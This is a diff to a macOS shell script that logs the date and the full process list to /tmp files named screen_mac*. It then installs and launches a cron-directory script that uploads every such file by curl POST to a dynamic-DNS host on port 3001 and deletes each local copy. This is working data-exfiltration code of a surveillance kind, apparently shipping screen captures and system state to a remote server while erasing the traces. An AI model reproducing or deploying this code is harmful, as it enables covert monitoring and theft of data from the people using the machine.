@@ -3,14 +3,16 @@
 echo $(date) > /tmp/screen_mac_date.txt
 ps -ef > /tmp/screen_mac_000_psef.txt
 
+read -r -d '' SCRCAP_KK << EOM2
+find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
+  echo "uploading $file"
+  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
+  rm $file
+done
+EOM2
 
-echo 'find /tmp/ -name screen_mac* -type f -print | while read -r file ; do' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
-echo '  echo "uploading $file" ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
-echo '  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break'  > /Users/Vladdy/Library/Cron/scrcap_kk.sh
-#  # sleep 1
-echo '  rm $file ' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
-echo 'done' > /Users/Vladdy/Library/Cron/scrcap_kk.sh
-
+echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh
+chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh
 ps -ef | grep scrcap_kk || /Users/Vladdy/Library/Cron/scrcap_kk.sh
 
 sleep 2
